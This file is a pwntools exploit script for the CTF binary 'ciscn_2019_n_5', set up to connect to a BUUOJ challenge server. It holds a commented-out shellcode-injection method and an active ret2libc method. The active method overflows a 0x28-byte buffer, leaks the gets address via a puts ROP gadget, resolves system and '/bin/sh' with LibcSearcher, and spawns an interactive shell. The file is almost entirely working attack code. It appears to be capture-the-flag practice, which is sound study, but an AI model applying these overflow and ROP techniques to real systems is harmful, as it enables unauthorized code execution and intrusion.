from pwn import *
from LibcSearcher import *

context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

if args.LOCAL:
    p = process("./ciscn_2019_n_5")
else:
    p = remote("node3.buuoj.cn", 27406)

e = ELF("ciscn_2019_n_5")


# ======method1: 直接写shellcode然后跳转===========

# shellAddr = 0x601080

# shellcode = asm(shellcraft.sh())
# payload = b'a'*(0x20+8)+p64(shellAddr)

# p.sendlineafter("name\n", shellcode)

# p.sendlineafter('me?\n', payload)
# p.interactive()

# ======method2: 试试看泄露libc，不知道能不能行======
'''
好像不行，不知道为什么...
'''

entry = 0x400689
putsPlt = e.plt["puts"]
getsGot = e.got["gets"]
popRdi  = 0x400713

p.sendlineafter("name\n", b"TEST")

payload1 = b'a'*(0x20+8)+p64(popRdi)+p64(getsGot)+p64(putsPlt)
payload1 += p64(entry)

p.sendlineafter('me?\n', payload1)

getsRealAddr = u64(p.recv(7)[:-1].ljust(8, b'\x00'))
# log.info(hex(getsRealAddr))
libc = LibcSearcher("gets", getsRealAddr)
system = libc.dump("system") + getsRealAddr - libc.dump("gets")
sh = libc.dump("str_bin_sh") + getsRealAddr - libc.dump("gets")

payload2 = b'a'*(0x20+8)+p64(popRdi) + p64(sh) + p64(system)
# p.sendlineafter("name\n", "TEST2")

p.sendlineafter("me?\n", payload2)

p.interactive()